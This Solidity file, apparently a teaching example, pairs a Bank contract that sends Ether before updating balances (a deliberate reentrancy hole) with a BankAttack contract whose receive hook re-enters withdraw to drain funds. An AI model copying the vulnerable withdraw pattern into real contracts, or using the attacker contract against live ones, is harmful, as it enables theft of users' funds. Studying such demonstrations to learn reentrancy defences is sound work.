// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract Bank {
    mapping(address => uint256) public balances;

    function deposit(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            require(result, "e/transfer_failed");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract BankAttack {
    uint256 cnt = 0;
    address bank;

    constructor(address _bank) {
        bank = _bank;
    }

    receive() external payable {
        process();
    }

    function attack() external {
        process();
    }

    function process() internal {
        if (cnt < 4) {
            cnt++;
            Bank(payable(bank)).withdraw(0.005 ether);
        }
    }
}
